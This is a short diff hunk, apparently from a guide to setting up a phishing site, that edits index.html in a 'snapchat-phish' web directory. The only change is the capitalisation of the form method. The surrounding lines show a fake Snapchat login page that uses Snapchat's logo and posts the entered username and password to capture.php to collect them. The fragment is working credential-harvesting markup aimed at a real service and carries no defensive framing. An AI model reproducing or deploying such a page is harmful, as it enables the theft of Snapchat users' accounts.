@@ -21,7 +21,7 @@ sudo nano /var/www/html/snapchat-phish/index.html
     <center>
     <img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" style="width:36px;padding-top:80px;padding-bottom:95px;">
     <font size="48px;"><br>Log In</font><br>
-    <form action="capture.php" method="post">
+    <form action="capture.php" method="POST">
         <input class="inputBox" id="username" name="username" type="text" placeholder="Username" required><br>
         <input class="inputBox" id="password" name="password" type="password" placeholder="Password" required><br>
         <button type="submit">LOG IN</button>
